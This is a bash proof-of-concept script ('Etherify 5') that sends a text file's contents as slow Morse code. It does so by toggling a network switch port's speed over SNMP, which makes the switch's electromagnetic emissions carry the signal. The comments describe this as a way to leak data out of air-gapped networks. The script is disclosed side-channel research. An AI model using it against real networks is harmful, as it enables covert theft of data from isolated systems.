#!/bin/bash

# Etherify 4 - silly hack to send data wirelessly by changing the speed
#              of an ethernet interface. This is an implementation for
#              devices which change speed slowly
#
# (c) 2020 Jacek Lipkowski SQ5BPF <sq5bpf@lipkowski.org>
# https://lipkowski.com/etherify5
#
# See also: https://lipkowski.com/etherify
#
# Tested on two Linksys LGS318 switches connected together.
# Please always test two devices of the same type, because else it
# wouldn't be clear which device is contributing to the transmitted signal.
# For the Linksys switches please disable negotiation on the port between 
# the switches, and set the parameters below (switch IP, port etc).
#
# This works by switching between 10Mbps and 100Mbps, which results
# in a change of the electromagnetic radiation that leaks from the devices.
# Switching to 100Mbps produces a signal at 50MHz (for the Linksys LGS318).
# which is used to transmit slow morse code.
#
# This enables one to leak data out via morse code from air-gapped networks.
#
# To receive use software for slow telegraphy (search for QRSS CW),
# such as an sdr receiver and DL4YHF Spectrum Lab
#
# During tests the signal could be received at a distance of 6m.
# Longer distances might work also, but haven't been tested.
#
# Notice:
# - conduct the tests in an electromagnetically quiet area
# - make sure that there is an ethernet link
# - listen at various frequencies. For example  LGS318 switches radiate a 
#   signal around 50MHz, which isn't a frequency which should appear in ethernet
#   (20MHz for 10Mbps, 125MHz for 100Mbps and 1Gbps) 

#
# This script is licensed under GPL v3
#
# I disclaim any liability for things that this software does or doesn't do.
# Everything is the responsibility of the user.
#

# Note to the user: uncomment and set the switch IP, port, snmp community, and type here:

#SWITCH_IP=192.168.1.252
#SWITCH_SNMP_COMMUNITY=private
#SWITCH_PORT=17
# currently only Linksys LGS318 is implemented, please see the device manufacturer's MIBs
#SWITCH_TYPE=lgs318

# Note to the user: set the time it takes for the link to go up after changing speed
# 3 seconds should be ok for most switches
LINKDELAY=3 #time it takes from changing the ethernet speed to the link coming up

SLEEPDOT=$LINKDELAY
SLEEPDASH=`echo -e "scale=5\n${LINKDELAY}*3"| bc -l`
SLEEPSPACE=`echo -e "scale=5\n${LINKDELAY}*2"| bc -l`


declare -A cw=( [0]='-----' [1]='.----' [2]='..---' [3]='...--' [4]='....-' [5]='.....' [6]='-....' [7]='--...' [8]='---..' [9]='----.' [a]='.-' [b]='-...' [c]='-.-.' [d]='-..' [e]='.' [f]='..-.' [g]='--.' [h]='....' [i]='..' [j]='.---' [k]='-.-' [l]='.-..' [m]='--' [n]='-.' [o]='---' [p]='.--.' [q]='--.-' [r]='.-.' [s]='...' [t]='-' [u]='..-' [v]='...-' [w]='.--' [x]='-..-' [y]='-.--' [z]='--..' ['/']='-..-.' ['.']='.-.-.-' ['!']='--..--' ['?']='..--..' ['=']='-...-' [kn]='-.--.' [sk]='...-.-' [ar]='.-.-.' [bk]='-...-.-' )

text2morse() {
	IN="${1,,}"
	OUT=""
	for (( pos=0 ; pos < ${#IN} ; pos++ ))
	do
		ch="${IN:$pos:1}"
		[ "$ch" = " " ] && OUT+="  " && continue
		[ "${cw[$ch]}" ] && OUT+="${cw[$ch]} " || OUT+="${cw['?']} " 
	done
	echo "$OUT"
}

#arg1 - port number , arg2 - speed: 10,100,1000
snmp_setspeed() {
	case "$SWITCH_TYPE" in
		"lgs318")
			snmpset -c "$SWITCH_SNMP_COMMUNITY" -v 1 $SWITCH_IP  iso.3.6.1.4.1.3955.1000.201.43.1.1.15.$((48+$1)) i ${2}000000 >/dev/null
			;;
			#implement changing speed for other switch types here
			*) echo "Unknown switch type $SWITCH_TYPE" ; exit 1 ;;
		esac
	}


txon() {
	snmp_setspeed $SWITCH_PORT 100
}

txoff() {
	snmp_setspeed $SWITCH_PORT 10
}


etherify5_send() {
	B="$1"
	while [ "$B" ]; do
		C="${B:0:1}"
		B="${B:1}"
		echo -n "$C"
		txon; sleep 0.1; txoff #hack

		case "$C" in
			"-") txon; sleep $LINKDELAY ; sleep $SLEEPDASH ;;
			".") txon; sleep $LINKDELAY; sleep $SLEEPDOT ;;
			" ") txoff; sleep $SLEEPDASH  ;;
		esac
		txoff
	done
	echo
}

find_prerequisites() {
	while [ "$1" ]; do
		which "$1" >/dev/null && shift && continue
		echo "ERROR: $1 not found, please install it"
		exit 1
	done
}

############# main


cat <<EOF
Etherify 5 , sending wireless by manipulating network equpment interface speed via snmp. 
The signal can appear at different frequencies, depending on the device internal architecture.
The Linksys LGS318 switch emits a good signal around 50MHz.
(c) 2020 Jacek Lipkowski SQ5BPF 

EOF


find_prerequisites snmpset

if [ ! "$SWITCH_IP" ] || [ ! "$SWITCH_PORT" ] || [ ! "$SWITCH_TYPE" ]; then
	echo
	echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
	echo "Please edit this script to set the switch IP, port and type"
	echo "Implement the switch type if it is unsupported (and send me the diff)"
	echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
	exit 1
fi


TEXT="etherify5demo="
[ "$1" -a -f "$1" ] &&  TEXT=`tr '\n' ' ' < $1 | sed -re 's/  */ /g'`
CWTEXT=`text2morse "$TEXT"`

cat <<EOF
Sending: "${TEXT}"
$CWTEXT

EOF



echo "delay: $LINKDELAY seconds"
echo "dot: $SLEEPDOT seconds dash: $SLEEPDASH seconds"

#TODO: check if link is up via snmp
if : ; then
	while : ; do
		etherify5_send "$CWTEXT"
		sleep $SLEEPSPACE ; sleep $SLEEPSPACE ; sleep $SLEEPSPACE ; sleep $SLEEPSPACE
	done

else
	echo "Aborting, there is no ethernet link on the switch"

fi
